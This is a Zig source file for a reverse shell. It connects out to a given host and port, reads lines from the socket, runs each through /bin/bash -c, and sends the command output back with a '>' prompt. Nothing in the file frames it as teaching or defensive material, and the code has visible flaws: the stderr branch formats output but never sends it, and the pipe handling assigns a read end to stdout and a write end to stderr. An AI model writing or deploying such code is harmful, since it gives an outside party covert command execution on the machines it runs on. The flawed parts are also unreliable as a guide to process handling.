const std = @import("std");

const MAX_INPUT_BYTES: usize = 1024;
const MAX_OUTPUT_BYTES: usize = 2048;

fn readCommand(allocator: std.mem.Allocator, cmd: *std.ArrayList([]const u8), socket: std.net.Stream) !void {
    try cmd.appendSlice(&[_][]const u8{ "/bin/bash", "-c" });

    var buf: [MAX_INPUT_BYTES]u8 = undefined;
    const buf_size = try socket.read(buf[0..]);
    if (buf_size == 0) return error.ServerClosed;

    try cmd.append(try allocator.dupe(u8, buf[0 .. buf_size - 1])); // Remove last character ('\n') from the buf.
}

fn sendResult(allocator: std.mem.Allocator, socket: std.net.Stream, stdout: []const u8, stderr: []const u8) !void {
    if (stdout.len > 0) {
        const out = std.fmt.allocPrint(allocator, "{s}\n> ", .{stdout}) catch {
            _ = try socket.writeAll("> ");
            return;
        };
        defer allocator.free(out);
        _ = try socket.writeAll(out);
    } else if (stderr.len > 0) {
        const out = std.fmt.allocPrint(allocator, "{s}\n> ", .{stderr}) catch {
            _ = try socket.writeAll("> ");
            return;
        };
        defer allocator.free(out);
    } else {
        _ = try socket.writeAll("> ");
    }
}

pub fn run(allocator: std.mem.Allocator, addr: []const u8, port: u16) !void {
    var socket = try std.net.tcpConnectToHost(allocator, addr, port);
    defer socket.close();
    try sendResult(allocator, socket, "", "");

    var output_stdout = std.ArrayList(u8).init(allocator);
    defer output_stdout.deinit();
    var output_stderr = std.ArrayList(u8).init(allocator);
    defer output_stderr.deinit();

    var cmd = std.ArrayList([]const u8).init(allocator);
    defer {
        for (cmd.items) |c| {
            allocator.free(c);
        }
        cmd.deinit();
    }

    while (true) {
        // Initialize
        for (cmd.items) |c| {
            allocator.free(c);
        }
        cmd.clearRetainingCapacity();
        output_stdout.clearRetainingCapacity();
        output_stderr.clearRetainingCapacity();

        // Read command.
        readCommand(allocator, &cmd, socket) catch |err| {
            switch (err) {
                error.ServerClosed => break,
                else => {
                    std.debug.print("Error: {}\n", .{err});
                    continue;
                },
            }
        };

        // Execute the command.
        // Source: https://github.com/ziglang/zig/blob/master/lib/std/process/Child.zig#L208
        var p = std.process.Child.init(cmd.items, allocator);
        p.stdout_behavior = .Pipe;
        p.stderr_behavior = .Pipe;
        const fds = try std.posix.pipe2(.{ .CLOEXEC = true });
        p.stdout = std.fs.File{ .handle = fds[0] };
        p.stderr = std.fs.File{ .handle = fds[1] };
        try p.spawn();

        try p.collectOutput(&output_stdout, &output_stderr, MAX_OUTPUT_BYTES);

        _ = p.wait() catch |err| {
            const error_message = try std.fmt.allocPrint(allocator, "error: {}\n", .{err});
            defer allocator.free(error_message);
            _ = try socket.write(error_message);
            continue;
        };

        try sendResult(allocator, socket, output_stdout.items, output_stderr.items);
    }
}
